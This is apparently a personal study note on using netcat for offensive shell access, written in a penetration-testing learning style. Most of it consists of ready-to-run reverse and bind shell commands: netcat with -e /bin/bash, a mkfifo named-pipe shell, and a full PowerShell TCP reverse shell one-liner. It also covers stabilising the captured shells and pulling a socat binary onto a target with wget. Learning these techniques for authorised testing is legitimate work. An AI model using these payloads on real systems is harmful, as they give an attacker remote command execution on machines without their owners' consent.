## Netcat (The Neko)
​
Netcat is the traditional "Swiss Army Knife" of networking. It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques.
​
​
### Reverse Shells

#### Listener (Attacker Machine)

>[!Success] Basics
>```
>nc -lvnp {port}
>```

- -l is used to tell netcat that this will be a listener
- -v is used to request a verbose output
- -n tells netcat not to resolve host names or use DNS
- -p indicates that the port specification will follow

​
Be aware that if you choose to use a =={*port*}== below 1024, you will need to use ==sudo== when starting your listener. That said, it's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.
​
​
#### Talker (Target Machine)

##### Linux & ¿Windows?

>[!Tip] Basics
>```
>nc {local IP} {local port}
>```

​
>[!Danger] With Payload integrated
>```
>nc {local IP} {local port} -e /bin/bash
>```

​
==-e== option which allows you to execute a process on connection
​
This ==With Payload integrated== is not included in most versions of netcat as it is widely seen to be very insecure (funny that, huh?). On Windows where a static binary is nearly always required anyway, this technique will work perfectly.
​

>[!Success] Chebra, final form (more stable)
>```
>mkfifo /tmp/f; nc {local IP} {local port} < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
>```

​
The command first creates a [named pipe](https://www.linuxjournal.com/article/2156) at ==/tmp/f==. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into ==sh==, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.
​
​
##### Modern Windows Systems

>[!Success] The Windows Case
>```
>powershell -c "$client = New-Object System.Net.Sockets.TCPClient('{local IP}',{local port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
>```

​
​
### Bind Shells

#### Listener (Target Machine)

>[!Tip] Basics
>```
>nc -lvnp {port}
>```

​
>[!Danger] With Payload integrated
>```
>nc -lvnp {port} -e /bin/bash
>```

​
>[!Success] Chebra
>```
>mkfifo /tmp/f; nc -lvnp {port} < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
>```

​
​
#### Talker (Attacker Machine)

>[!Tip] Chebra
>```
>nc {target IP} {target port}
>```

​
If we are looking to obtain a bind shell on a target then we can assume that there is already a listener waiting for us on a chosen port of the target: all we need to do is connect to it.
​
​
### Stabilization
​
These shells are very unstable by default. Pressing Ctrl + C kills the whole thing. They are non-interactive, and often have strange formatting errors. This is due to netcat "shells" really being processes running inside a terminal, rather than being bonafide terminals in their own right. Fortunately, there are many ways to stabilise netcat shells.
​
​
#### Python (Attacking Machine POV)

This is applicable only to ==Linux== boxes, as they will nearly always have Python installed by default. This is a four stage process:

1. Invoke:
   
   >[!Tip] Chebra
   >```
   >python -c 'import pty;pty.spawn("/bin/bash")'
   >```
   
   ​
   Uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace python with ==python2== or ==python3== as required. At this point our shell will look a bit prettier, but we still ==won't be able== to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
   ​
   ​
2. XTerminator
   
   >[!Tip] Chebra
   >```
   >export TERM=xterm
   >```
   
   ​
   This will give us access to term commands such as ==clear==.
   ​
   ​
3. Background
   
   >[!Tip] Chebra
   >```
   >CTRL + Z
   >```
   
   ​
   It backgrounds the shell.
   ​
   ​
4. Foreground
   
   >[!Tip] Chebra
   >```
   >stty raw -echo; fg
   >```
   
   ​
   This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
   ​
   
Whole process bru:
​

![[Pasted image 20230318055139.png]]

​
Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type ==reset== and press enter.
​
​
#### Rlwrap (Attacking Machine POV)

Applicable for ==Windows or Linux==, rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. Need four steps:

1. Install
   
   >[!Tip] Chebra
   >```
   >sudo apt install rlwrap
   >```
   
   ​
   ​
2. Invoke
   
   >[!Tip] Chebra
   >```
   >rlwrap nc -lvnp {port}
   >```
   
   ​
   Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with ==Windows shells==, which are otherwise notoriously difficult to stabilise.
   ​
   ​
3. Background
   
   >[!Tip] Chebra
   >```
   >CTRL + Z
   >```
   
   ​
   ​
4. Foreground
   
   >[!Tip] Chebra
   >```
   >stty raw -echo; fg
   >```
   
   ​
   This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
   ​
   ​
#### Socat (Mixed POV)

Uses an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to ==Linux targets==, as a Socat shell on Windows ==will be no more stable than a netcat shell==. Need three steps after jumping to Socat:

1. Download Compiled Binary (AM POV)
   
   >https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
   
   ​
   In the github page only click on ==Download== and put it in the same directory where you'll open the server. We are going to leave the name by default as ==socat==.
   ​
   ​
2. Open server (AM POV)
   
   >[!Tip] Chebra
   >```
   >sudo python3 -m http.server {any port}
   >```
   
   ​
   Remember to run this command while being in the ==same directory== as the Compiled Binary that you just downloaded in the previous step.
   ​
   ​
3. Get file (TM POV)
   
   >[!Tip] Chebra
   >```
   >wget {Atacking Machine IP}/socat -O /tmp/socat
   >```
   
   ​
   This command is going to take the file named ==socat== (remember that we leave this name by default in the first step) and its putting it with the same name in the ==tmp directory==.
   ​
   ​
4. Next
   
   Lets continue as a Socat technique in [[Socat]]
   ​
   ​
### Re-Size
​
With any of the above techniques, it's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.
​
First we need a reference from our regular terminal:

>[!Tip] Chebra
>```
>stty -a
>```

​

![[Pasted image 20230318063426.png]]

​
Then we adjust our reverse/bind shell size:

>[!Tip] Chebra
>```
>stty rows {number}
>```
>```
>stty cols {number}
>```

​
Filling in the numbers you got from running the command in your own terminal.